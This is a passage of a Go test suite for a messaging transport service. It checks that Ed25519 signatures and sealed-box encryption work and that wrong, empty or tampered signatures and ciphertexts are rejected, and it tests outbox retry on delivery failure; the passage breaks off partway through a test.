package test

import (
	"context"
	"crypto/ed25519"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mr-tron/base58"
	dinacrypto "github.com/rajmohanutopai/dina/core/internal/adapter/crypto"
	"github.com/rajmohanutopai/dina/core/internal/domain"
	"github.com/rajmohanutopai/dina/core/internal/ingress"
	"github.com/rajmohanutopai/dina/core/internal/port"
	"github.com/rajmohanutopai/dina/core/internal/service"
	"github.com/rajmohanutopai/dina/core/test/testutil"
)

// ==========================================================================
// Adversarial & Negative Tests — Transport Security, Retry, Ingress
// These tests exercise failure paths that the happy-path suite cannot reach:
//   - Signature tampering → rejection
//   - Delivery failure → outbox retry / backoff
//   - Flood / spool exhaustion → rate limiting
// ==========================================================================

// ---------- Local mocks for port interfaces ----------

// mockIdentitySigner wraps a real Ed25519 private key.
type mockIdentitySigner struct {
	priv ed25519.PrivateKey
}

func (m *mockIdentitySigner) Sign(_ context.Context, data []byte) ([]byte, error) {
	return ed25519.Sign(m.priv, data), nil
}

func (m *mockIdentitySigner) PublicKey() ed25519.PublicKey {
	return m.priv.Public().(ed25519.PublicKey)
}

// mockDIDResolver returns pre-configured DID Documents.
type mockDIDResolver struct {
	docs map[string]*domain.DIDDocument
}

func (m *mockDIDResolver) Resolve(_ context.Context, did domain.DID) (*domain.DIDDocument, error) {
	doc, ok := m.docs[string(did)]
	if !ok {
		return nil, domain.ErrDIDNotFound
	}
	return doc, nil
}

func (m *mockDIDResolver) InvalidateCache(_ domain.DID) {}

// mockDeliverer records delivery attempts and optionally fails.
type mockDeliverer struct {
	calls    []deliverCall
	failNext bool
	err      error
}

type deliverCall struct {
	endpoint string
	payload  []byte
}

func (m *mockDeliverer) Deliver(_ context.Context, endpoint string, payload []byte) error {
	m.calls = append(m.calls, deliverCall{endpoint, payload})
	if m.failNext || m.err != nil {
		if m.err != nil {
			return m.err
		}
		return errors.New("delivery failed")
	}
	return nil
}

// mockVaultManager tracks open/closed state for ingress Router tests.
type mockVaultManager struct {
	openPersonas map[domain.PersonaName]bool
}

func (m *mockVaultManager) Open(_ context.Context, persona domain.PersonaName, _ []byte) error {
	m.openPersonas[persona] = true
	return nil
}

func (m *mockVaultManager) Close(persona domain.PersonaName) error {
	delete(m.openPersonas, persona)
	return nil
}

func (m *mockVaultManager) IsOpen(persona domain.PersonaName) bool {
	return m.openPersonas[persona]
}

func (m *mockVaultManager) OpenPersonas() []domain.PersonaName {
	var names []domain.PersonaName
	for n := range m.openPersonas {
		names = append(names, n)
	}
	return names
}

func (m *mockVaultManager) Checkpoint(_ domain.PersonaName) error { return nil }

// mockInboxManager for ingress tests.
type mockInboxManager struct {
	spoolData [][]byte
	spoolMax  int
}

func (m *mockInboxManager) CheckIPRate(_ string) bool      { return true }
func (m *mockInboxManager) CheckGlobalRate() bool           { return true }
func (m *mockInboxManager) CheckPayloadSize(p []byte) bool  { return len(p) <= 256*1024 }

func (m *mockInboxManager) Spool(_ context.Context, payload []byte) (string, error) {
	if m.spoolMax > 0 && len(m.spoolData) >= m.spoolMax {
		return "", errors.New("spool full")
	}
	m.spoolData = append(m.spoolData, payload)
	return "spool-id", nil
}

func (m *mockInboxManager) SpoolSize() (int64, error) {
	var total int64
	for _, d := range m.spoolData {
		total += int64(len(d))
	}
	return total, nil
}

func (m *mockInboxManager) ProcessSpool(_ context.Context) (int, error) {
	n := len(m.spoolData)
	m.spoolData = nil
	return n, nil
}

func (m *mockInboxManager) DrainSpool(_ context.Context) ([][]byte, error) {
	payloads := make([][]byte, len(m.spoolData))
	copy(payloads, m.spoolData)
	m.spoolData = nil
	return payloads, nil
}

// transportTestClock implements port.Clock with a fixed time.
type transportTestClock struct {
	now time.Time
}

func (c *transportTestClock) Now() time.Time                         { return c.now }
func (c *transportTestClock) After(d time.Duration) <-chan time.Time { return time.After(d) }
func (c *transportTestClock) NewTicker(d time.Duration) *time.Ticker { return time.NewTicker(d) }

// ---------- Helper: build a TransportService with real crypto ----------

type transportTestEnv struct {
	svc        *service.TransportService
	signer     port.Signer
	encryptor  port.Encryptor
	converter  port.KeyConverter
	resolver   *mockDIDResolver
	outbox     *testutil.MockOutboxManager
	deliverer  *mockDeliverer
	senderPub  ed25519.PublicKey
	senderPriv ed25519.PrivateKey
	rcptPub    ed25519.PublicKey
	rcptPriv   ed25519.PrivateKey
}

func newTransportTestEnv(t *testing.T) *transportTestEnv {
	t.Helper()

	signer := dinacrypto.NewEd25519Signer()
	encryptor := dinacrypto.NewNaClBoxSealer()
	converter := dinacrypto.NewKeyConverter()
	clk := &transportTestClock{now: time.Now()}

	// Generate sender and recipient Ed25519 keypairs from deterministic seeds.
	senderSeed := [32]byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
		0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
		0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20}
	rcptSeed := [32]byte{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11,
		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
		0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11,
		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99}

	senderPub, senderPriv, err := signer.GenerateFromSeed(senderSeed[:])
	if err != nil {
		t.Fatalf("generate sender keys: %v", err)
	}
	rcptPub, rcptPriv, err := signer.GenerateFromSeed(rcptSeed[:])
	if err != nil {
		t.Fatalf("generate recipient keys: %v", err)
	}

	senderDID := domain.DID("did:key:z6MkSenderTest")
	rcptDID := domain.DID("did:key:z6MkRecipientTest")

	// Build DID Documents with the real public keys (multibase: "z" + base58btc(0xed01 + pubkey)).
	resolver := &mockDIDResolver{docs: map[string]*domain.DIDDocument{
		string(senderDID): {
			ID: string(senderDID),
			VerificationMethod: []domain.VerificationMethod{{
				ID:                 string(senderDID) + "#key-1",
				Type:               "Ed25519VerificationKey2020",
				Controller:         string(senderDID),
				PublicKeyMultibase: "z" + base58.Encode(append([]byte{0xed, 0x01}, senderPub...)),
			}},
			Service: []domain.ServiceEndpoint{{
				ID:              "#didcomm",
				Type:            "DIDCommMessaging",
				ServiceEndpoint: "https://sender.test/msg",
			}},
		},
		string(rcptDID): {
			ID: string(rcptDID),
			VerificationMethod: []domain.VerificationMethod{{
				ID:                 string(rcptDID) + "#key-1",
				Type:               "Ed25519VerificationKey2020",
				Controller:         string(rcptDID),
				PublicKeyMultibase: "z" + base58.Encode(append([]byte{0xed, 0x01}, rcptPub...)),
			}},
			Service: []domain.ServiceEndpoint{{
				ID:              "#didcomm",
				Type:            "DIDCommMessaging",
				ServiceEndpoint: "https://recipient.test/msg",
			}},
		},
	}}

	outbox := testutil.NewMockOutboxManager()
	inbox := testutil.NewMockInboxManager()
	identitySigner := &mockIdentitySigner{priv: ed25519.PrivateKey(senderPriv)}

	svc := service.NewTransportService(encryptor, identitySigner, converter, resolver, outbox, inbox, clk)
	svc.SetVerifier(signer)

	deliverer := &mockDeliverer{}
	svc.SetDeliverer(deliverer)

	return &transportTestEnv{
		svc:        svc,
		signer:     signer,
		encryptor:  encryptor,
		converter:  converter,
		resolver:   resolver,
		outbox:     outbox,
		deliverer:  deliverer,
		senderPub:  senderPub,
		senderPriv: senderPriv,
		rcptPub:    rcptPub,
		rcptPriv:   rcptPriv,
	}
}

// ==========================================================================
// §A1 — Signature Verification (adversarial tests)
// ==========================================================================

// TST-CORE-934
func TestAdv_29_1_SendStoresSignature(t *testing.T) {
	// Requirements (§29.1):
	//   - SendMessage signs the plaintext DinaMessage JSON with Ed25519
	//   - The signature is stored in the OutboxMessage.Sig field before delivery
	//   - After successful delivery, status changes to "delivered"
	//   - The D2D delivery payload encodes sig as hex, ciphertext as base64
	//   - The signature is over the PLAINTEXT (not ciphertext), enabling
	//     verification after decryption on the receiving end

	t.Run("sig_stored_and_status_delivered", func(t *testing.T) {
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:   "msg-sig-001",
			Type: domain.MsgTypeSocialUpdate,
			From: "did:key:z6MkSenderTest",
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"hello"}`),
		}

		err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		if err != nil {
			t.Fatalf("SendMessage failed: %v", err)
		}

		stored, err := env.outbox.GetByID("outbox-1")
		if err != nil {
			t.Fatalf("GetByID: %v", err)
		}
		if len(stored.Sig) == 0 {
			t.Fatal("outbox message Sig must be non-empty — Ed25519 signature was stored")
		}
		if stored.Status != "delivered" {
			t.Fatalf("expected status 'delivered' (immediate delivery succeeded), got %q", stored.Status)
		}
	})

	t.Run("sig_is_valid_ed25519_64_bytes", func(t *testing.T) {
		// Ed25519 signatures are always exactly 64 bytes.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:   "msg-sig-size",
			Type: domain.MsgTypeSocialUpdate,
			From: "did:key:z6MkSenderTest",
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"size check"}`),
		}

		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		stored, _ := env.outbox.GetByID("outbox-1")

		if len(stored.Sig) != 64 {
			t.Fatalf("Ed25519 signature must be exactly 64 bytes, got %d", len(stored.Sig))
		}
	})

	t.Run("sig_verifies_against_plaintext", func(t *testing.T) {
		// The signature must be over the plaintext JSON, not the ciphertext.
		// Verify by re-marshaling the message and checking the signature.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:          "msg-sig-verify",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: 1700000000,
			Body:        []byte(`{"q":"verify me"}`),
		}

		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		stored, _ := env.outbox.GetByID("outbox-1")

		// Re-marshal the message to get the plaintext that was signed.
		// Note: From may have been set by the service if it was empty.
		plaintext, _ := json.Marshal(msg)

		// Verify the signature using the sender's public key.
		valid, verifyErr := env.signer.Verify(env.senderPub, plaintext, stored.Sig)
		if verifyErr != nil {
			t.Fatalf("Verify: %v", verifyErr)
		}
		if !valid {
			t.Fatal("outbox signature must verify against the plaintext DinaMessage JSON")
		}

		// Anti-tautological: verify the sig does NOT verify against the ciphertext.
		if len(stored.Payload) > 0 {
			wrongValid, _ := env.signer.Verify(env.senderPub, stored.Payload, stored.Sig)
			if wrongValid {
				t.Fatal("signature must NOT verify against ciphertext — it signs plaintext")
			}
		}
	})

	t.Run("delivery_payload_has_hex_sig_and_base64_ciphertext", func(t *testing.T) {
		// The D2D wire format is {"c":"<base64>","s":"<hex>"}.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:   "msg-wire-format",
			Type: domain.MsgTypeSocialUpdate,
			From: "did:key:z6MkSenderTest",
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"wire format test"}`),
		}

		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)

		// The deliverer should have been called with the D2D payload.
		if len(env.deliverer.calls) == 0 {
			t.Fatal("deliverer should have been called with D2D payload")
		}

		deliveryPayload := env.deliverer.calls[0].payload
		var d2d struct {
			C string `json:"c"` // base64 ciphertext
			S string `json:"s"` // hex signature
		}
		if err := json.Unmarshal(deliveryPayload, &d2d); err != nil {
			t.Fatalf("delivery payload is not valid JSON: %v", err)
		}
		if d2d.C == "" {
			t.Fatal("delivery payload must contain base64-encoded ciphertext in 'c' field")
		}
		if d2d.S == "" {
			t.Fatal("delivery payload must contain hex-encoded signature in 's' field")
		}

		// Verify the hex-encoded sig decodes to 64 bytes (Ed25519 signature size).
		sigBytes, err := hex.DecodeString(d2d.S)
		if err != nil {
			t.Fatalf("'s' field is not valid hex: %v", err)
		}
		if len(sigBytes) != 64 {
			t.Fatalf("decoded signature should be 64 bytes, got %d", len(sigBytes))
		}
	})

	t.Run("different_messages_produce_different_sigs", func(t *testing.T) {
		// Anti-tautological: two different messages must produce different
		// signatures, proving the signature is actually computed per-message.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msg1 := domain.DinaMessage{
			ID:   "msg-diff-1",
			Type: domain.MsgTypeSocialUpdate,
			From: "did:key:z6MkSenderTest",
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"message one"}`),
		}
		msg2 := domain.DinaMessage{
			ID:   "msg-diff-2",
			Type: domain.MsgTypeSocialUpdate,
			From: "did:key:z6MkSenderTest",
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"message two"}`),
		}

		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg1)
		stored1, _ := env.outbox.GetByID("outbox-1")

		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg2)
		stored2, _ := env.outbox.GetByID("outbox-2")

		if hex.EncodeToString(stored1.Sig) == hex.EncodeToString(stored2.Sig) {
			t.Fatal("different messages must produce different Ed25519 signatures")
		}
	})
}

// TST-ADV-002: ReceiveMessage with valid signature succeeds.
// TST-CORE-935
func TestAdv_29_1_ValidSignatureAccepted(t *testing.T) {
	// Requirement: Signed+encrypted envelope from known sender →
	// Decrypted message returned, no error. The full receive path must:
	// 1. Decrypt the NaCl sealed box ciphertext
	// 2. Verify the Ed25519 signature over the plaintext
	// 3. Return the original message with all fields intact

	t.Run("basic_valid_sig_decrypts_successfully", func(t *testing.T) {
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:          "msg-sig-002",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"valid sig test"}`),
		}
		plaintext, _ := json.Marshal(msg)

		sig, err := env.signer.Sign(env.senderPriv, plaintext)
		if err != nil {
			t.Fatalf("sign: %v", err)
		}

		rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
		ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

		envelope := domain.DinaEnvelope{
			Typ:        "application/dina-encrypted+json",
			FromKID:    "did:key:z6MkSenderTest#key-1",
			ToKID:      "did:key:z6MkRecipientTest#key-1",
			Ciphertext: string(ciphertext),
			Sig:        hex.EncodeToString(sig),
		}

		result, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
		if err != nil {
			t.Fatalf("ReceiveMessage should succeed with valid sig: %v", err)
		}
		if result.ID != "msg-sig-002" {
			t.Fatalf("expected msg ID 'msg-sig-002', got %q", result.ID)
		}
	})

	t.Run("all_message_fields_preserved", func(t *testing.T) {
		// Verify that the decrypted message preserves ALL fields, not just ID.
		// This catches truncation, field-swapping, or partial-decrypt bugs.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		now := time.Now().Unix()
		msg := domain.DinaMessage{
			ID:          "msg-fields-001",
			Type:        "dina/social/arrival",
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: now,
			Body:        []byte(`{"text":"arriving in 15 minutes","location":"plaza"}`),
		}
		plaintext, _ := json.Marshal(msg)

		sig, _ := env.signer.Sign(env.senderPriv, plaintext)
		rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
		ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

		envelope := domain.DinaEnvelope{
			Typ:        "application/dina-encrypted+json",
			FromKID:    "did:key:z6MkSenderTest#key-1",
			ToKID:      "did:key:z6MkRecipientTest#key-1",
			Ciphertext: string(ciphertext),
			Sig:        hex.EncodeToString(sig),
		}

		result, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
		if err != nil {
			t.Fatalf("ReceiveMessage failed: %v", err)
		}

		// Verify every field is preserved after decrypt.
		if result.ID != "msg-fields-001" {
			t.Errorf("ID: want 'msg-fields-001', got %q", result.ID)
		}
		if result.Type != "dina/social/arrival" {
			t.Errorf("Type: want 'dina/social/arrival', got %q", result.Type)
		}
		if result.From != "did:key:z6MkSenderTest" {
			t.Errorf("From: want sender DID, got %q", result.From)
		}
		if len(result.To) != 1 || result.To[0] != "did:key:z6MkRecipientTest" {
			t.Errorf("To: want [recipient DID], got %v", result.To)
		}
		if result.CreatedTime != now {
			t.Errorf("CreatedTime: want %d, got %d", now, result.CreatedTime)
		}
		if string(result.Body) != `{"text":"arriving in 15 minutes","location":"plaza"}` {
			t.Errorf("Body: want original JSON, got %s", result.Body)
		}
	})

	t.Run("signature_genuinely_verified_not_skipped", func(t *testing.T) {
		// CRITICAL: Prove that the signature is ACTUALLY checked by showing
		// that a wrong signature fails. Without this, the "valid sig accepted"
		// test could pass even if signature verification is a no-op.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		msg := domain.DinaMessage{
			ID:          "msg-sig-verify-check",
			Type:        domain.MsgTypeSocialUpdate,
			From:        "did:key:z6MkSenderTest",
			To:          []string{"did:key:z6MkRecipientTest"},
			CreatedTime: time.Now().Unix(),
			Body:        []byte(`{"q":"sig verification check"}`),
		}
		plaintext, _ := json.Marshal(msg)

		// Sign with WRONG key (recipient's key, not sender's).
		wrongSig, _ := env.signer.Sign(env.rcptPriv, plaintext)

		rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
		ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

		envelope := domain.DinaEnvelope{
			Typ:        "application/dina-encrypted+json",
			FromKID:    "did:key:z6MkSenderTest#key-1",
			ToKID:      "did:key:z6MkRecipientTest#key-1",
			Ciphertext: string(ciphertext),
			Sig:        hex.EncodeToString(wrongSig),
		}

		_, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
		if err == nil {
			t.Fatal("ReceiveMessage with wrong signature should fail — signature verification may be a no-op")
		}
		if !errors.Is(err, domain.ErrInvalidSignature) {
			t.Fatalf("expected ErrInvalidSignature, got: %v", err)
		}
	})

	t.Run("different_message_types_accepted", func(t *testing.T) {
		// Valid signatures must be accepted regardless of message type.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		messageTypes := []domain.MessageType{
			domain.MsgTypeSocialUpdate,
			"dina/social/arrival",
			"dina/task/complete",
			"dina/nudge/response",
		}

		for _, msgType := range messageTypes {
			msg := domain.DinaMessage{
				ID:          "msg-type-" + string(msgType),
				Type:        msgType,
				From:        "did:key:z6MkSenderTest",
				To:          []string{"did:key:z6MkRecipientTest"},
				CreatedTime: time.Now().Unix(),
				Body:        []byte(`{"data":"test"}`),
			}
			plaintext, _ := json.Marshal(msg)
			sig, _ := env.signer.Sign(env.senderPriv, plaintext)
			rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
			ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

			envelope := domain.DinaEnvelope{
				Typ:        "application/dina-encrypted+json",
				FromKID:    "did:key:z6MkSenderTest#key-1",
				ToKID:      "did:key:z6MkRecipientTest#key-1",
				Ciphertext: string(ciphertext),
				Sig:        hex.EncodeToString(sig),
			}

			result, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
			if err != nil {
				t.Fatalf("type %q: ReceiveMessage failed: %v", msgType, err)
			}
			if result.Type != msgType {
				t.Errorf("type mismatch: want %q, got %q", msgType, result.Type)
			}
		}
	})
}

// TST-CORE-936
// TST-ADV-003: ReceiveMessage with wrong signature is rejected.
func TestAdv_29_1_WrongSignatureRejected(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	msg := domain.DinaMessage{
		ID:          "msg-sig-003",
		Type:        domain.MsgTypeSocialUpdate,
		From:        "did:key:z6MkSenderTest",
		To:          []string{"did:key:z6MkRecipientTest"},
		CreatedTime: time.Now().Unix(),
		Body:        []byte(`{"q":"tampered sig test"}`),
	}
	plaintext, _ := json.Marshal(msg)

	// Sign with the RECIPIENT's key (wrong signer — not the sender).
	wrongSig, err := env.signer.Sign(env.rcptPriv, plaintext)
	if err != nil {
		t.Fatalf("sign: %v", err)
	}

	// Encrypt for recipient.
	rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
	ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

	envelope := domain.DinaEnvelope{
		Typ:        "application/dina-encrypted+json",
		FromKID:    "did:key:z6MkSenderTest#key-1",
		ToKID:      "did:key:z6MkRecipientTest#key-1",
		Ciphertext: string(ciphertext),
		Sig:        hex.EncodeToString(wrongSig),
	}

	_, err = env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
	if err == nil {
		t.Fatal("ReceiveMessage should reject an envelope with a wrong signature")
	}
	if !errors.Is(err, domain.ErrInvalidSignature) {
		t.Fatalf("expected ErrInvalidSignature, got: %v", err)
	}
}

// TST-CORE-937
// TST-ADV-004: ReceiveMessage with tampered ciphertext (bit flip) is rejected.
func TestAdv_29_1_TamperedCiphertextRejected(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	msg := domain.DinaMessage{
		ID:          "msg-sig-004",
		Type:        domain.MsgTypeSocialUpdate,
		From:        "did:key:z6MkSenderTest",
		To:          []string{"did:key:z6MkRecipientTest"},
		CreatedTime: time.Now().Unix(),
		Body:        []byte(`{"q":"tamper test"}`),
	}
	plaintext, _ := json.Marshal(msg)

	sig, _ := env.signer.Sign(env.senderPriv, plaintext)
	rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
	ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

	// Tamper with ciphertext — flip a byte in the middle.
	tampered := make([]byte, len(ciphertext))
	copy(tampered, ciphertext)
	if len(tampered) > 10 {
		tampered[10] ^= 0xff
	}

	envelope := domain.DinaEnvelope{
		Typ:        "application/dina-encrypted+json",
		Ciphertext: string(tampered),
		Sig:        hex.EncodeToString(sig),
	}

	_, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
	if err == nil {
		t.Fatal("ReceiveMessage should reject tampered ciphertext")
	}
	// Error could be decryption failure — that's fine, the point is it doesn't succeed.
}

// TST-ADV-005: ReceiveMessage with empty sig is rejected (no unsigned messages accepted).
func TestAdv_29_1_EmptySigRejected(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	msg := domain.DinaMessage{
		ID:          "msg-sig-005",
		Type:        domain.MsgTypeSocialUpdate,
		From:        "did:key:z6MkSenderTest",
		To:          []string{"did:key:z6MkRecipientTest"},
		CreatedTime: time.Now().Unix(),
		Body:        []byte(`{"q":"no sig rejected"}`),
	}
	plaintext, _ := json.Marshal(msg)

	rcptX25519Pub, _ := env.converter.Ed25519ToX25519Public(env.rcptPub)
	ciphertext, _ := env.encryptor.SealAnonymous(plaintext, rcptX25519Pub)

	// Envelope with empty signature — must be rejected.
	envelope := domain.DinaEnvelope{
		Typ:        "application/dina-encrypted+json",
		Ciphertext: string(ciphertext),
		Sig:        "", // no signature
	}

	_, err := env.svc.ReceiveMessage(ctx, envelope, env.rcptPub, env.rcptPriv)
	if err == nil {
		t.Fatal("ReceiveMessage should reject empty-sig envelope")
	}
}

// ==========================================================================
// §A2 — Outbox Retry (adversarial tests)
// ==========================================================================

// TST-ADV-006: ProcessOutbox delivers pending messages and marks delivered.
// (Note: tests SendMessage immediate delivery path, not ProcessOutbox retry path.)
func TestAdv_29_2_OutboxDeliverSuccess(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// Send a message — this enqueues it and attempts immediate delivery.
	msg := domain.DinaMessage{
		ID:   "msg-outbox-001",
		Type: domain.MsgTypeSocialUpdate,
		From: "did:key:z6MkSenderTest",
		To:   []string{"did:key:z6MkRecipientTest"},
		Body: []byte(`{"q":"outbox test"}`),
	}
	err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
	if err != nil {
		t.Fatalf("SendMessage: %v", err)
	}

	// Immediate delivery should have succeeded (deliverer doesn't fail by default).
	if len(env.deliverer.calls) == 0 {
		t.Fatal("expected at least 1 delivery attempt")
	}
	if env.deliverer.calls[0].endpoint != "https://recipient.test/msg" {
		t.Fatalf("expected endpoint 'https://recipient.test/msg', got %q", env.deliverer.calls[0].endpoint)
	}
}

// TST-CORE-940
// TST-ADV-007: ProcessOutbox marks failed when delivery errors.
func TestAdv_29_2_OutboxDeliveryFailure(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// Make deliverer fail.
	env.deliverer.err = errors.New("connection refused")

	msg := domain.DinaMessage{
		ID:   "msg-outbox-002",
		Type: domain.MsgTypeSocialUpdate,
		From: "did:key:z6MkSenderTest",
		To:   []string{"did:key:z6MkRecipientTest"},
		Body: []byte(`{"q":"fail delivery test"}`),
	}
	err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
	if err != nil {
		t.Fatalf("SendMessage: %v", err)
	}

	// Delivery failed — message should still be in outbox (pending, not delivered).
	// The immediate delivery failure doesn't mark failed — only ProcessOutbox does.
	pending, _ := env.outbox.ListPending(ctx)
	if len(pending) == 0 {
		t.Fatal("message should remain pending after failed immediate delivery")
	}

	// Now run ProcessOutbox — this should attempt redelivery and mark failed.
	processed, err := env.svc.ProcessOutbox(ctx)
	if err != nil {
		t.Fatalf("ProcessOutbox: %v", err)
	}
	if processed != 1 {
		t.Fatalf("expected 1 processed, got %d", processed)
	}

	// After ProcessOutbox with failed delivery, message should be marked failed.
	pending2, _ := env.outbox.ListPending(ctx)
	if len(pending2) != 0 {
		t.Fatalf("expected 0 pending after ProcessOutbox failure, got %d", len(pending2))
	}
}

// TST-CORE-941
// TST-ADV-008: ProcessOutbox retries succeed after transient failure.
func TestAdv_29_2_OutboxRetryTransient(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// First delivery fails.
	env.deliverer.err = errors.New("timeout")

	msg := domain.DinaMessage{
		ID:   "msg-outbox-003",
		Type: domain.MsgTypeSocialUpdate,
		From: "did:key:z6MkSenderTest",
		To:   []string{"did:key:z6MkRecipientTest"},
		Body: []byte(`{"q":"retry test"}`),
	}
	_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)

	// ProcessOutbox with failing deliverer.
	env.svc.ProcessOutbox(ctx)

	// Now "fix" the deliverer — next attempt succeeds.
	env.deliverer.err = nil

	// Re-enqueue the message (simulating the retry scheduler requeueing).
	pending, _ := env.outbox.ListPending(ctx)
	// After MarkFailed, the message status is "failed", not "pending".
	// Requeue it manually to simulate the retry scheduler.
	for _, p := range pending {
		_ = env.outbox.Requeue(ctx, p.ID)
	}

	// If there's a failed message, requeue it.
	failedMsg, _ := env.outbox.GetByID("outbox-1")
	if failedMsg != nil && failedMsg.Status == "failed" {
		_ = env.outbox.Requeue(ctx, failedMsg.ID)
	}

	// Run ProcessOutbox again with working deliverer.
	processed, err := env.svc.ProcessOutbox(ctx)
	if err != nil {
		t.Fatalf("ProcessOutbox (retry): %v", err)
	}

	// If message was requeued, it should now be delivered.
	if processed > 0 {
		if len(env.deliverer.calls) < 2 {
			t.Fatal("expected at least 2 delivery attempts (initial + retry)")
		}
	}
}

// TST-ADV-009: ProcessOutbox with unresolvable DID marks failed.
func TestAdv_29_2_OutboxUnresolvableDID(t *testing.T) {
	env := newTransportTestEnv(t)
	ctx := context.Background()

	// Enqueue a message to a DID that the resolver doesn't know.
	unknownMsg := domain.OutboxMessage{
		ID:        "unknown-did-001",
		ToDID:     "did:key:z6MkUnknownRecipient",
		Payload:   []byte("encrypted-payload"),
		Status:    "pending",
		CreatedAt: time.Now().Unix(),
		NextRetry: time.Now().Unix(),
	}
	_, err := env.outbox.Enqueue(ctx, unknownMsg)
	if err != nil {
		t.Fatalf("Enqueue: %v", err)
	}

	processed, err := env.svc.ProcessOutbox(ctx)
	if err != nil {
		t.Fatalf("ProcessOutbox: %v", err)
	}
	if processed != 1 {
		t.Fatalf("expected 1 processed, got %d", processed)
	}

	// Message should no longer be pending (marked failed).
	pending, _ := env.outbox.ListPending(ctx)
	if len(pending) != 0 {
		t.Fatalf("expected 0 pending after unresolvable DID, got %d", len(pending))
	}
}

// TST-CORE-943
// TST-ADV-010: ProcessOutbox with no deliverer marks all failed.
func TestAdv_29_2_OutboxNoDeliverer(t *testing.T) {
	// Create a service without a deliverer.
	signer := dinacrypto.NewEd25519Signer()
	encryptor := dinacrypto.NewNaClBoxSealer()
	converter := dinacrypto.NewKeyConverter()
	clk := &transportTestClock{now: time.Now()}

	senderSeed := [32]byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
		0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
		0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20}
	_, senderPriv, _ := signer.GenerateFromSeed(senderSeed[:])
	rcptSeed := [32]byte{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11,
		0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
		0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11,
